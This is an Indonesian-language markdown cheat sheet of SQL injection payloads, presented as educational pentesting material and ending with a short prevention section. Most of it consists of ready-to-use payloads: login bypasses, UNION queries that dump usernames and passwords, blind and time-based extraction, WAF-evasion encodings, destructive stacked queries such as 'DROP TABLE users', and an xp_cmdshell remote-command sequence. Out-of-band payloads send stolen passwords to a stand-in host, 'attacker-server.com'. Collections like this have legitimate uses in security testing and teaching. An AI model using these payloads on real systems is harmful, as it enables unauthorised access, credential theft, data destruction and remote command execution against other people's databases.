# SQL Injection Payload Collection

Koleksi lengkap payload SQL Injection (SQLi) untuk tujuan edukasi, penetration testing, dan bug bounty. File ini mencakup berbagai teknik, penjelasan, dan contoh penggunaan.

> [!WARNING]
> Penyalahgunaan informasi ini untuk menyerang sistem tanpa izin tertulis adalah ilegal. Gunakan hanya untuk tujuan pembelajaran dan pengujian keamanan yang sah.

---

## Daftar Isi
1. [Pendahuluan](#pendahuluan)
2. [Authentication Bypass](#authentication-bypass)
3. [UNION Based SQLi](#union-based-sqli)
4. [Error Based SQLi](#error-based-sqli)
5. [Blind SQLi (Boolean-based)](#blind-sqli-boolean-based)
6. [Blind SQLi (Time-based)](#blind-sqli-time-based)
7. [Out-of-Band (OOB) SQLi](#out-of-band-oob-sqli)
8. [Second-Order SQLi](#second-order-sqli)
9. [Stacked Queries](#stacked-queries)
10. [Database Specific Payloads](#database-specific-payloads)
11. [WAF Bypass & Encoding](#waf-bypass--encoding)
12. [Contoh Skenario Penggunaan](#contoh-skenario-penggunaan)
13. [Cara Pencegahan](#cara-pencegahan)
14. [Automated Tools](#automated-tools)
15. [Bonus: NoSQL Injection](#bonus-nosql-injection)

---

## 1. Pendahuluan
**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang untuk mengganggu query yang dibuat aplikasi ke databasenya. Hal ini umumnya memungkinkan penyerang untuk melihat data yang biasanya tidak dapat mereka ambil, memodifikasi atau menghapus data, dan dalam beberapa kasus, mendapatkan akses administratif ke database.

---

## 2. Authentication Bypass
Digunakan untuk melewati form login tanpa mengetahui username atau password yang valid.

### Payloads Umum:
- `' OR 1=1 --`
- `" OR 1=1 --`
- `admin' --`
- `admin' #`
- `admin'/*`
- `' OR '1'='1`
- `' OR TRUE --`
- `') OR ('1'='1`

### Penjelasan:
Payload `' OR 1=1 --` mengubah query SQL asli:
`SELECT * FROM users WHERE username = '$user' AND password = '$pass'`
Menjadi:
`SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'`
Karena `1=1` selalu bernilai TRUE, database akan mengembalikan user pertama (biasanya admin) dan mengabaikan sisa query (password) karena adanya tanda komentar `--`.

---

## 3. UNION Based SQLi
Teknik ini menggunakan operator `UNION` untuk menggabungkan hasil dari query asli dengan hasil dari query yang disisipkan penyerang.

### Langkah-langkah:
1. **Mencari jumlah kolom:**
   - `' ORDER BY 1 --`
   - `' ORDER BY 2 --` (Lanjutkan sampai error)
2. **Mencari kolom yang menampilkan data:**
   - `' UNION SELECT 1,2,3 --`
3. **Mendapatkan nama database/versi:**
   - `' UNION SELECT 1,database(),version() --`
4. **Mendapatkan nama tabel:**
   - `' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --`
5. **Mendapatkan nama kolom:**
   - `' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --`
6. **Dump data:**
   - `' UNION SELECT 1,username,password FROM users --`

---

## 4. Error Based SQLi
Digunakan ketika aplikasi tidak menampilkan data secara langsung, tetapi menampilkan pesan error database yang detail.

### Payloads (MySQL):
- `' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`
- `EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))`
- `UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)`

### Penjelasan:
Fungsi seperti `EXTRACTVALUE` atau `UPDATEXML` akan memicu error karena format XPath yang tidak valid (diawali dengan `~` atau `0x7e`), dan pesan error tersebut akan mengandung hasil dari query yang kita masukkan.

---

## 5. Blind SQLi (Boolean-based)
Digunakan ketika aplikasi hanya memberikan respon "Benar" (misal: halaman tampil normal) atau "Salah" (misal: halaman kosong atau pesan error umum).

### Contoh Payload:
- `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --`
- `' AND 1=(SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%') --`

### Cara Kerja:
Penyerang menanyakan pertanyaan Ya/Tidak ke database. Jika tebakan karakter pertama password adalah 'a' dan responnya TRUE, maka karakter tersebut benar. Proses ini diulang untuk setiap karakter.

---

## 6. Blind SQLi (Time-based)
Digunakan ketika aplikasi tidak memberikan perbedaan respon visual antara TRUE dan FALSE, namun kita bisa mengamati waktu respon server.

### Payloads:
- **MySQL:** `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --`
- **PostgreSQL:** `' AND 1=(SELECT 1 FROM pg_sleep(5)) --`
- **MSSQL:** `' IF (1=1) WAITFOR DELAY '0:0:5' --`

### Cara Kerja:
Jika query `SLEEP(5)` dieksekusi, server akan menunda respon selama 5 detik. Jika kita menerima respon dengan delay tersebut, artinya kondisi yang kita masukkan adalah TRUE.

---

## 7. Out-of-Band (OOB) SQLi
Teknik ini menggunakan fungsi database untuk membuat permintaan HTTP atau DNS ke server yang dikendalikan penyerang, membawa data yang ingin dicuri. Sangat berguna jika respon query tidak ditampilkan dan Time-based SQLi terlalu lambat.

### Payloads:
- **MySQL (Windows):** `' OR 1=1 SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker-server.com\\a')) --`
- **MSSQL:** `DECLARE @p varchar(1024); SET @p = (SELECT password FROM users WHERE id=1); EXEC('master..xp_dirtree "\\' + @p + '.attacker-server.com\a"')`
- **Oracle:** `SELECT UTL_HTTP.REQUEST('http://attacker-server.com/'||(SELECT user FROM dual)) FROM dual`

---

## 8. Second-Order SQLi
Terjadi ketika input berbahaya disimpan oleh aplikasi di database, kemudian digunakan kembali dalam query SQL lain tanpa sanitasi yang tepat di lain waktu.

### Contoh Skenario:
1. Penyerang mendaftar akun dengan username: `admin' --`
2. Aplikasi menyimpan username tersebut ke tabel `users`.
3. Penyerang masuk ke fitur "Change Password".
4. Query internal aplikasi: `UPDATE users SET password = '$new_pass' WHERE username = '$session_user'`
5. Menjadi: `UPDATE users SET password = 'hacked' WHERE username = 'admin' --'`
6. **Hasil:** Password admin yang asli berhasil diubah!

---

## 9. Stacked Queries
Teknik menjalankan beberapa statement SQL sekaligus dalam satu input dengan memisahkannya menggunakan titik koma (`;`).

### Payloads:
- `'; DROP TABLE users; --`
- `'; UPDATE products SET price = 0 WHERE id = 10; --`
- `'; EXEC xp_cmdshell 'whoami'; --` (MSSQL)

### Penjelasan:
Teknik ini sangat berbahaya karena memungkinkan penyerang melakukan modifikasi data (UPDATE/DELETE/DROP) bahkan jika query aslinya adalah SELECT. Namun, tidak semua API database mendukung eksekusi multi-statement (misalnya, PHP `mysqli` secara default memblokir ini).

---

## 10. Database Specific Payloads

### MySQL / MariaDB
- **Version:** `@@version` atau `version()`
- **User:** `user()` atau `current_user()`
- **List Databases:** `SELECT schema_name FROM information_schema.schemata`

### PostgreSQL
- **Version:** `VERSION()`
- **User:** `user` atau `current_user`
- **List Tables:** `SELECT tablename FROM pg_catalog.pg_tables`

### Microsoft SQL Server (MSSQL)
- **Version:** `@@version`
- **User:** `user_name()`
- **XP_CMDSHELL (RCE):** `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';`

### Oracle
- **Version:** `SELECT banner FROM v$version`
- **User:** `SELECT user FROM dual`
- **List Tables:** `SELECT table_name FROM all_tables`

---

## 11. WAF Bypass & Encoding
Teknik untuk melewati Web Application Firewall (WAF) atau filter input.

### Case Variation:
- `UnIoN SeLeCt` (Bukan `UNION SELECT`)

### URL Encoding:
- `%27%20OR%201%3D1%20--`

### Hex Encoding:
- `SELECT * FROM users WHERE username = 0x61646d696e` (0x61646d696e = 'admin')

### Comments:
- `UNION/**/SELECT/**/1,2,3`
- `/*!UNION*//*!SELECT*/` (MySQL Specific)

---

## 12. Contoh Skenario Penggunaan

### Skenario A: Vulnerable URL Parameter
**URL:** `https://example.com/products.php?id=10`
**Payload:** `10' UNION SELECT 1,user(),database() --`
**Hasil:** Detail user dan nama database akan tampil di halaman produk.

### Skenario B: Vulnerable Login Form
**Input Username:** `admin' #`
**Input Password:** (kosong)
**Hasil:** Bypass login sebagai admin karena sisa query password dikomentari.

### Skenario C: Hidden Data via Search
**Search Box:** `%' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() #`
**Hasil:** Menampilkan semua nama tabel di hasil pencarian.

---

## 13. Cara Pencegahan
Mencegah SQL Injection jauh lebih baik daripada mencoba mendeteksinya.

### 1. Parameterized Queries (Prepared Statements)
Ini adalah cara paling efektif. Data tidak pernah digabungkan langsung ke string SQL.
```php
// Contoh PHP dengan PDO
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
$user = $stmt->fetch();
```

### 2. Gunakan ORM (Object-Relational Mapping)
Gunakan library seperti Eloquent (Laravel), Hibernate (Java), atau SQLAlchemy (Python) yang secara otomatis melakukan parameterisasi.

### 3. Input Validation & Sanitization
Validasi input user (misal: pastikan ID adalah angka) dan bersihkan karakter berbahaya, namun ini bukan solusi utama (hanya tambahan).

### 4. Principle of Least Privilege
Jangan jalankan database sebagai `root` atau `sa`. Gunakan user dengan hak akses terbatas yang hanya bisa mengakses tabel yang diperlukan.

---

## 14. Automated Tools
Meskipun penting untuk memahami cara kerja manual, dalam pengujian nyata sering digunakan alat otomatis untuk efisiensi.

- **sqlmap:** Alat open-source paling populer untuk mendeteksi dan memanfaatkan celah SQLi secara otomatis.
  - Contoh: `sqlmap -u "http://example.com/id=1" --dbs`
- **Burp Suite:** Memiliki fitur "Intruder" dan scanner aktif yang sangat kuat untuk menemukan SQLi.
- **GVM (OpenVAS):** Vulnerability scanner untuk memindai seluruh infrastruktur.

---

## 15. Bonus: NoSQL Injection
Seiring populernya database NoSQL (seperti MongoDB), muncul juga serangan serupa yang menargetkan query NoSQL.

### Contoh (MongoDB):
- **Payload:** `{"username": {"$ne": null}, "password": {"$ne": null}}`
- **Penjelasan:** Operator `$ne` (not equal) akan mencocokkan dokumen di mana username dan password tidak null, sehingga penyerang bisa login tanpa kredensial.

---
**Dibuat oleh Antigravity untuk tujuan edukasi.**
